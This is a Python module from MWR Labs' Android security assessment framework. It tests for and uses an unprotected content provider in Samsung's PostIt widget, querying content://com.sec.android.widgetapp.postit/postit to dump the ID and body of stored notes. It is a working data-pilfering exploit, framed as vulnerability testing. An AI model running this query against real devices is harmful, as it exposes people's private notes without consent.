from mwr.droidhg.modules import common, Module

class PostIt(Module, common.Provider, common.TableFormatter, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.sec.android.widgetapp.postit."
    description = "Tests for Content Provider vulnerability in com.sec.android.widgetapp.postit."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["exploit", "pilfer", "oem", "samsung"]

    label = "Note entries from PostIt (com.sec.android.widgetapp.postit)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.sec.android.widgetapp.postit/postit", projection=["_id", "body"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
